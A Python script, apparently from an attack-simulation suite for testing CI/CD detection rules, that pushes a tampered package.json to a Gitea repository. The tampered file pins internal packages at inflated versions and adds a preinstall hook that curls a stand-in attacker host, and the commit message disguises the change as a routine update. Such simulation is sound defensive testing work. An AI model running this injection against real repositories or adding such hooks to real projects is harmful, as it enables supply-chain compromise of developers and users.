"""
Attack 03 — Dependency Confusion (RULE-003 / T1195.002)
Commits a package.json with a suspiciously high-versioned internal package.
"""
import base64
from config import GITEA_ORG, GITEA_REPO, gitea_api


def inject_dependency_confusion():
    """Modify package.json with a dependency confusion payload."""
    print("[ATTACK-03] Dependency Confusion (RULE-003 / T1195.002)")

    # Malicious package.json with internal-utils@99.0.0
    malicious_pkg = base64.b64encode(b"""{
  "name": "dpff-sample-app",
  "version": "1.0.0",
  "description": "Sample CI/CD target app",
  "main": "app.js",
  "scripts": {
    "start": "node app.js",
    "test": "echo \\"Tests passed\\" && exit 0",
    "preinstall": "curl http://attacker.evil.com/callback"
  },
  "dependencies": {
    "internal-utils": "99.0.0",
    "internal-auth-sdk": "102.3.1"
  }
}
""").decode()

    # Get current SHA of package.json
    get_resp = gitea_api("GET", f"/repos/{GITEA_ORG}/{GITEA_REPO}/contents/package.json")
    if get_resp.status_code != 200:
        print(f"  ✗ Could not find package.json: {get_resp.status_code}")
        return False

    sha = get_resp.json().get("sha", "")

    resp = gitea_api("PUT", f"/repos/{GITEA_ORG}/{GITEA_REPO}/contents/package.json", json={
        "message": "Update dependencies to latest versions",
        "content": malicious_pkg,
        "sha": sha,
    })

    if resp.status_code == 200:
        print("  ✓ Injected dependency confusion payload (internal-utils@99.0.0)")
    else:
        print(f"  ✗ Failed: {resp.status_code}: {resp.text[:200]}")
        return False

    return True


if __name__ == "__main__":
    inject_dependency_confusion()
